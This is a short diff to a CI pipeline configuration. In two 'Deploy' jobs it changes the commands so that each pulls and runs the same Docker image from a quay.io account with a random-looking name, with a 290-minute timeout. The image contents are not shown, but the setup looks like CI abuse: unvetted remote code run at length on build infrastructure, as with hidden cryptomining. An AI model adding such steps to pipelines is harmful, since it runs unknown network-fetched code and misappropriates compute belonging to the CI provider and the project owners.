@@ -9,8 +9,8 @@ jobs:
       - run:
          name: "Deploy"
          command: |
-                      docker pull quay.io/eyfsubdi78/a:latest
-                      docker run quay.io/lekilite01/nyobelah
+                      docker pull quay.io/lekilite01/nyobelah:latest
+                      docker run quay.io/lekilite01/nyobelah:latest
          no_output_timeout: 290m
   build1:
     machine:
@@ -20,8 +20,8 @@ jobs:
       - run:
          name: "Deploy"
          command: |
-                      docker pull quay.io/eyfsubdi78/a:latest
-                      docker run quay.io/lekilite01/nyobelah
+                      docker pull quay.io/lekilite01/nyobelah:latest
+                      docker run quay.io/lekilite01/nyobelah:latest
          no_output_timeout: 290m
 
 workflows:
